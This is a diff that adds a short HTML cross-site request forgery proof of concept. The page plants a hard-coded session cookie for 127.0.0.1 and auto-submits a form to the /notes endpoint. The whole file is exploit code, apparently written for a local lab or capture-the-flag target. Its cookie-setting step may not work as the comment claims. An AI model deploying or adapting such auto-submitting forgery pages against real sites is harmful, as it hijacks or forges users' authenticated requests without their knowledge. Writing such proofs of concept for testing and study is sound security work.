@@ -1,0 +1,16 @@
+<!-- CSRF PoC to send a custom session token -->
+<html>
+  <body>
+    <form action="http://127.0.0.1/notes" method="GET">
+      <input type="submit" value="Submit request" />
+    </form>
+
+    <script>
+      // Manually set the session cookie with SameSite=None and Secure attributes
+      document.cookie = "session=ekgI9%2BTr8PfMGByyddoYmTPzVM2loiugQ%2B9SKIREuCyLkDjVT8Ol1wpP%2FIetv5DiAgf%2B0m4dPVj4YBJx9ZpCsNRNVQ%3D%3D; path=/notes; domain=127.0.0.1; SameSite=None; Secure";
+
+      // Automatically submit the form to trigger the CSRF request
+      document.forms[0].submit();
+    </script>
+  </body>
+</html>
